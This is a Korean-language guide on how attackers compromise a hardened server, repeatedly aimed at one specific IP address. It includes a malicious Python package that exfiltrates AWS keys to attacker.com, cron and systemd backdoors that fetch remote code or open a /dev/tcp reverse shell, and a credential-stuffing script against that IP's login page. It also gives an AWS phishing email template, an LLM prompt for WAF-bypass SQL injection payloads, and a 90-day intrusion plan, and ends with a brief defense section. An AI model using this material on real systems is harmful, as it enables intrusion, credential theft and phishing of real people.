# 실제 해커들의 공격 방법 - 강화된 서버 공략법

## 모든 엔드포인트가 막혔을 때 실제 해커들은 어떻게 하는가?

침투 테스트 도구와 자동화 스크립트로 안 되면 **답이 없는 것처럼 보이지만**, 실제 해커들은 **완전히 다른 접근 방식**을 사용합니다.

---

## 1. Zero-Day 취약점 사용

### 자동화 도구의 한계
```
sqlmap, Metasploit, Burp Suite 등은 "알려진 취약점"만 찾음
→ WAF는 이런 공격을 모두 차단하도록 설계됨
```

### 실제 해커의 방법
```
1. CVE 공개 전 취약점 (Zero-Day) 사용
2. Apache, PHP, MySQL의 최신 버전에도 미발견 취약점 존재
3. Bug Bounty 헌터들이 발견하는 새로운 공격 기법
```

### 예시: Apache 2.4.65 Zero-Day

```bash
# 예를 들어 Apache 2.4.65에 HTTP/2 처리 취약점이 있다면:
curl -X POST http://3.35.218.180 \
  --http2 \
  -H "Content-Length: -1" \
  -d "$(python3 exploit.py)"

# 이런 공격은 WAF 룰에 없음
# ModSecurity는 차단 못 함
```

**현실:**
- Zero-Day는 블랙마켓에서 수백만 원~수억 원
- 국가 지원 해커(APT)들이 주로 사용
- 일반 침투 테스트로는 발견 불가능

---

## 2. 소셜 엔지니어링 (인간이 약점)

### 기술적 방어가 완벽해도 인간은 약함

#### 2.1 피싱 공격

```
시나리오:
1. 서버 관리자의 이메일 주소 찾기 (LinkedIn, GitHub)
2. 가짜 "AWS 보안 경고" 이메일 발송
3. 피싱 사이트로 유도하여 AWS 자격증명 탈취
```

**실제 피싱 이메일 예시:**
```
From: security-alert@aws-notifications.com (가짜)
Subject: [긴급] EC2 인스턴스 무단 접근 탐지

안녕하세요,

귀하의 EC2 인스턴스 (i-1234567890abcdef0)에서 비정상적인 접근이 탐지되었습니다.

즉시 확인하려면 아래 링크를 클릭하세요:
https://aws-security-check.com/verify (가짜 사이트)

AWS Security Team
```

**성공률:**
- 일반 직원: 30-40%
- IT 담당자: 10-15%
- 단 한 명만 클릭하면 성공

#### 2.2 개발자 계정 탈취

```bash
# 개발자의 GitHub에서 실수로 커밋된 자격증명 찾기
git clone https://github.com/company/project
git log -p | grep -E "AKIA[0-9A-Z]{16}"

# 또는 공개된 Slack 메시지, Pastebin, Trello 등
```

**실제 사례:**
- 개발자가 `.env` 파일을 실수로 GitHub에 푸시
- Slack에서 "잠깐만, AWS 키 좀 던져줘" → 스크린샷
- Confluence 문서에 자격증명 하드코딩

---

## 3. 공급망 공격 (Supply Chain Attack)

### 서버가 완벽해도 서버가 사용하는 것이 취약하면?

#### 3.1 NPM/PyPI 패키지 감염

```python
# 서버에서 사용하는 requirements.txt
Flask==2.0.1
requests==2.28.0
boto3==1.24.0
some-utility-package==1.0.0  ← 해커가 만든 악성 패키지
```

**공격 시나리오:**
```
1. 인기 있는 패키지와 비슷한 이름의 악성 패키지 업로드
   - 예: "requests" vs "request" (오타)
   - Typosquatting 공격

2. 개발자가 실수로 설치:
   pip install request  # 오타!

3. 패키지가 자동으로 백도어 설치:
```

```python
# some-utility-package/__init__.py (악성 코드)
import os
import requests

# 패키지가 import될 때 자동 실행
if 'AWS_ACCESS_KEY_ID' in os.environ:
    credentials = {
        'access_key': os.environ['AWS_ACCESS_KEY_ID'],
        'secret_key': os.environ['AWS_SECRET_ACCESS_KEY']
    }
    requests.post('http://attacker.com/collect', json=credentials)
```

#### 3.2 Docker 이미지 감염

```dockerfile
# Dockerfile
FROM ubuntu:latest  ← 공식 이미지 아님
RUN apt-get update && apt-get install -y python3
```

**만약 ubuntu:latest가 악성 이미지라면?**
- 이미 백도어 포함
- 모든 서버 자동 감염

---

## 4. 내부자 공격 (Insider Threat)

### 가장 무서운 공격: 내부에서 시작

#### 시나리오 1: 불만 있는 직원

```
1. DevOps 엔지니어가 퇴사 예정
2. 퇴사 전 백도어 설치:
```

```bash
# SSH 키 추가 (본인만 아는 키)
echo "ssh-rsa AAAAB3NzaC... hidden@backdoor" >> /root/.ssh/authorized_keys

# Cron job 백도어
echo "*/10 * * * * curl http://personal-server.com/check | bash" | crontab -

# Systemd 백도어 (재부팅해도 유지)
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/공격자IP/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-update.service
```

#### 시나리오 2: 계정 공유

```
현실:
- 팀원들이 Root 비밀번호 공유
- Slack에 SSH 키 공유
- "잠깐만 내 계정 좀 써" → 백도어 설치
```

---

## 5. 물리적 접근 (Physical Access)

### 클라우드 서버는 안전? 천만에!

#### 5.1 AWS 데이터센터 직원 매수

```
시나리오:
1. AWS 데이터센터 청소 직원에게 접근
2. USB 드롭 (악성 USB를 바닥에 떨어뜨림)
3. 직원이 호기심에 USB를 서버에 꽂음
4. 자동으로 백도어 설치
```

**실제 사례:**
- Stuxnet (이란 원자력 시설 공격)
- USB를 통한 에어갭 네트워크 침투

#### 5.2 네트워크 장비 조작

```
공격 대상: 네트워크 라우터, 스위치

방법:
1. ISP 직원 매수 또는 침투
2. 라우터 펌웨어에 백도어 설치
3. 모든 트래픽 가로채기 (MITM)
```

---

## 6. 시간 싸움 (Time-based Attacks)

### 지금 안 되면 6개월 기다림

#### 6.1 패스워드 재사용 공격

```
전략:
1. 다른 웹사이트 해킹 (보안 약한 곳)
2. 사용자 이메일/비밀번호 수집
3. 6개월 후 대상 서버에 동일한 비밀번호 시도

통계:
- 사용자의 60%가 여러 사이트에 동일한 비밀번호 사용
- LinkedIn, Adobe, Yahoo 해킹 데이터 활용
```

```python
# credential_stuffing.py
import requests

# 다른 사이트에서 유출된 자격증명
leaked_credentials = [
    ("admin@company.com", "Summer2023!"),
    ("admin@company.com", "Company@123"),
    ("admin@company.com", "Passw0rd!"),
]

for email, password in leaked_credentials:
    response = requests.post(
        "http://3.35.218.180/login.php",
        data={"username": email, "password": password}
    )
    if "dashboard" in response.text:
        print(f"[+] Success: {email}:{password}")
```

#### 6.2 장기 정찰 (Long-term Reconnaissance)

```
전략:
1. 지금은 공격 안 함
2. 6개월~1년간 대상 서버 모니터링
3. 새로운 취약점 발견 시 즉시 공격
4. 관리자의 실수 대기 (백업 파일 업로드, 디버그 모드 활성화)
```

---

## 7. 인프라 주변 공격 (Adjacent Attacks)

### 서버는 안전해도 주변이 취약하면?

#### 7.1 DNS 하이재킹

```
서버는 완벽하지만 DNS는?

공격:
1. 도메인 등록 업체 계정 탈취 (GoDaddy, AWS Route53)
2. DNS 레코드 변경
   3.35.218.180 → 공격자의 서버 IP
3. 사용자들이 가짜 서버에 접속
4. 자격증명 수집
```

#### 7.2 CDN 중독 (CDN Poisoning)

```
공격:
1. CloudFlare, Akamai 등 CDN 캐시에 악성 콘텐츠 주입
2. 사용자들이 캐시된 악성 JavaScript 다운로드
3. XSS 공격 수행
```

#### 7.3 SSL 인증서 위조

```
공격:
1. Certificate Authority (CA) 침투
2. 가짜 SSL 인증서 발급
3. MITM 공격으로 트래픽 가로채기
```

**실제 사례:**
- DigiNotar CA 해킹 (2011)
- 가짜 Google 인증서 발급

---

## 8. AI 기반 자동화 공격

### 최신 트렌드: AI가 취약점 찾음

#### 8.1 AI Fuzzing

```python
# AI가 자동으로 페이로드 생성 및 테스트
import openai

def ai_generate_payload(target_url):
    prompt = f"""
    Generate 100 unique SQL injection payloads that can bypass ModSecurity WAF.
    Target: {target_url}
    WAF: ModSecurity OWASP CRS v3.3
    """

    payloads = openai.Completion.create(
        model="gpt-4",
        prompt=prompt
    )

    for payload in payloads:
        test_payload(target_url, payload)
```

#### 8.2 AI 기반 피싱

```
ChatGPT를 활용한 완벽한 피싱 이메일 생성:
- 대상의 LinkedIn 프로필 분석
- 말투, 관심사 파악
- 개인화된 피싱 이메일 자동 생성
```

---

## 9. 경제적 공격 (Economic Attacks)

### 돈으로 해결

#### 9.1 Ransomware-as-a-Service

```
해커가 직접 안 해도 됨:

1. 다크웹에서 ransomware 구매 ($5,000~$50,000)
2. 전문가가 만든 도구 사용
3. 서버 감염 후 데이터 암호화
4. 복호화 대가 요구 (비트코인)
```

#### 9.2 DDoS for Hire

```
서버를 직접 해킹 못 하면 다운시키면 됨:

1. DDoS 서비스 구매 ($100~$500/hour)
2. 서버 다운
3. 관리자가 긴급 대응 중 실수
4. 디버그 모드 활성화, 방화벽 임시 해제 등
5. 그 틈에 침투
```

---

## 10. 법적/사회적 공격

### 기술 아닌 방법

#### 10.1 DMCA Takedown 요청

```
전략:
1. 가짜 DMCA (저작권) 신고
2. 호스팅 제공자가 서버 중단
3. 관리자 혼란 중 백업 서버 공격 (보안 약함)
```

#### 10.2 법적 압력

```
시나리오:
1. 가짜 법원 명령 위조
2. 호스팅 업체에 "서버 데이터 제출" 요구
3. 데이터 획득
```

---

## 실제 해커가 이 서버를 공격한다면?

### 단계별 실제 공격 시나리오

#### Day 1-7: 정찰 및 정보 수집

```bash
# 1. 회사 정보 수집
- LinkedIn에서 직원 목록 확인
- GitHub에서 실수로 커밋된 자격증명 검색
- Shodan, Censys로 모든 서버 IP 스캔

# 2. 이메일 주소 수집
theHarvester -d company.com -b all

# 3. 서브도메인 찾기
amass enum -d company.com

# 4. 소셜 미디어 모니터링
- Twitter, Facebook에서 직원들의 불만 확인
- 퇴사 예정자 파악 (불만 있는 내부자 타겟)
```

#### Day 8-14: 피싱 캠페인

```
1. 10명의 직원에게 개인화된 피싱 이메일 발송
2. "AWS 보안 경고" 또는 "GitHub 계정 확인" 위장
3. 단 한 명만 클릭하면 자격증명 획득
```

#### Day 15-30: 탈취한 자격증명으로 접근

```bash
# 만약 개발자 계정 탈취 성공
ssh dev-user@3.35.218.180

# 백도어 설치
echo "ssh-rsa AAAAB3... attacker@evil" >> ~/.ssh/authorized_keys

# 권한 상승 시도
sudo -l
```

#### Day 31-60: 내부 네트워크 침투

```bash
# 피봇 공격
ssh dev-user@3.35.218.180

# 내부 네트워크 스캔
nmap -sn 172.31.0.0/16

# 다른 취약한 서버 찾기
for ip in 172.31.0.{1..254}; do
    nmap -p 22,3306,6379 $ip
done

# RDS, ElastiCache 등 내부 서비스 공격
```

#### Day 61-90: 지속성 확보 및 데이터 탈취

```bash
# Systemd 백도어 (재부팅 후에도 유지)
# Cron job 백도어
# AWS S3로 데이터 업로드
# 천천히 데이터 탈취 (탐지 회피)
```

---

## 방어 방법

### 기술적 방어만으로는 부족

#### 1. 직원 교육
```
- 피싱 이메일 식별 교육
- 비밀번호 관리자 사용 강제
- 2FA (Two-Factor Authentication) 필수
```

#### 2. 공급망 보안
```
- NPM/PyPI 패키지 감사
- Docker 이미지 스캔 (Trivy, Clair)
- Dependabot으로 자동 업데이트
```

#### 3. 제로 트러스트 (Zero Trust)
```
- 내부 네트워크도 신뢰하지 않음
- 모든 접근에 인증 필요
- 최소 권한 원칙
```

#### 4. 이상 탐지 (Anomaly Detection)
```
- AI 기반 로그 분석
- 비정상적인 접근 패턴 탐지
- SIEM (Security Information and Event Management)
```

#### 5. Bug Bounty 프로그램
```
- 해커들에게 합법적으로 보상
- 취약점 먼저 발견
- HackerOne, Bugcrowd 활용
```

---

## 결론

### "답이 없다"는 생각은 틀렸다

실제 해커들은:
1. ❌ 자동화 도구만 사용하지 않음
2. ✅ **인간 심리** 공격 (피싱, 사회공학)
3. ✅ **시간**을 무기로 사용 (6개월~1년 대기)
4. ✅ **돈**으로 해결 (Zero-Day 구매, Ransomware 서비스)
5. ✅ **주변 공격** (DNS, CDN, 공급망)
6. ✅ **내부자** 활용 (불만 직원, 매수)
7. ✅ **물리적 접근** (데이터센터, USB 드롭)

### 완벽한 보안은 없다

```
기술적 방어 100% + 인간 보안 0% = 취약함
기술적 방어 80% + 인간 보안 80% = 강력함
```

### 가장 중요한 것

**"사람"이 가장 큰 취약점이자 가장 강력한 방어선**

---

**참고 자료:**
- MITRE ATT&CK Framework
- OWASP Top 10
- 실제 APT 공격 사례 연구
- Social Engineering: The Art of Human Hacking (Kevin Mitnick)
